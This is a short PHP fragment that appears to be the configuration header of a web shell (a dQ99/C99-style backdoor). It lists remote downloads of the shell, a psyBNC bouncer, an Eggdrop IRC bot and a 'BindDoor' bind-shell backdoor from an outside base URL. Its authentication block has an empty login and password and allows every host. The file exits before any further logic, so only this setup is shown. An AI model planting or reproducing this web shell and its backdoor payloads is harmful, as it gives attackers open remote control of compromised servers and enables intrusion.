<?php
define('sh_ver',"2.0.03.09");       

$sh_name = sh_name();                
   

$dQ99sh_sourcesurl = $sh_mainurl."readme.txt";
$sh_sourcez = array(
  "dQ99Sh"   => array($sh_mainurl."readme.txt","kiddie.php"),
  "psyBNC"   => array($sh_mainurl."dQBNC.tar.gz","dQBNC.tar.gz"),
  "Eggdrop"  => array($sh_mainurl."allnet.tar.gz","allnet.tar.gz"),
  "BindDoor" => array($sh_mainurl."bind.tgz","bind.tgz"),
);
##[ AUTHENTICATION ]##
$auth = array(
  "login"     => "",
  "pass"      => "",
  "md5pass"   => "",
  "hostallow" => array("*"),
  "denied"    => "<a href=\"$sh_mainurl\">".$sh_name."</a>: access denied!",
);

exit;
?>